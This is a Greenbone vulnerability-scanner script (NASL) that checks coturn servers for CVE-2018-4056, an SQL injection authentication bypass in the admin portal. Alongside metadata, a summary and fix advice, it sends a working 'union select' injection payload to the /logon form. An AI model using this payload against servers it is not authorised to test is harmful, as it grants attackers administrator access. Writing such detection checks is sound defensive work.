CPE = "cpe:/a:coturn:coturn";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.141944" );
	script_version( "2021-08-30T09:01:25+0000" );
	script_tag( name: "last_modification", value: "2021-08-30 09:01:25 +0000 (Mon, 30 Aug 2021)" );
	script_tag( name: "creation_date", value: "2019-01-31 13:03:06 +0700 (Thu, 31 Jan 2019)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2019-02-20 18:46:00 +0000 (Wed, 20 Feb 2019)" );
	script_cve_id( "CVE-2018-4056" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "coturn <= 4.5.0.8 Authentication Bypass Vulnerability (Active Check)" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2019 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_coturn_http_detect.sc" );
	script_mandatory_keys( "coturn/detected" );
	script_tag( name: "summary", value: "An exploitable SQL injection vulnerability exists in the administrator web
portal function of coturn. A login message with a specially crafted username can cause an SQL injection, resulting
in authentication bypass, which could give access to the TURN server administrator web portal. An attacker can log
in via the external interface of the TURN server to trigger this vulnerability." );
	script_tag( name: "affected", value: "coturn before version 4.5.0.9." );
	script_tag( name: "solution", value: "Update to version 4.5.0.9 or later." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP POST request and checks the response." );
	script_xref( name: "URL", value: "https://blog.talosintelligence.com/2019/01/vulnerability-spotlight-multiple.html" );
	script_xref( name: "URL", value: "http://www.talosintelligence.com/reports/TALOS-2018-0730" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port, nofork: TRUE )){
	exit( 0 );
}
req = http_get( port: port, item: "/favicon.ico" );
res = http_keepalive_send_recv( port: port, data: req );
url = "/logon";
data = "uname=%27+union+select+%27%27%2C%270000%27%3B+--&pwd=0000";
headers = make_array( "Content-Type", "application/x-www-form-urlencoded" );
req = http_post_put_req( port: port, url: url, data: data, add_headers: headers );
res = http_keepalive_send_recv( port: port, data: req );
if(ContainsString( res, "<i>' union select" ) && ContainsString( res, "Set Admin Session Realm" )){
	report = "It was possible to bypass authentication and login as an admin user.";
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 0 );

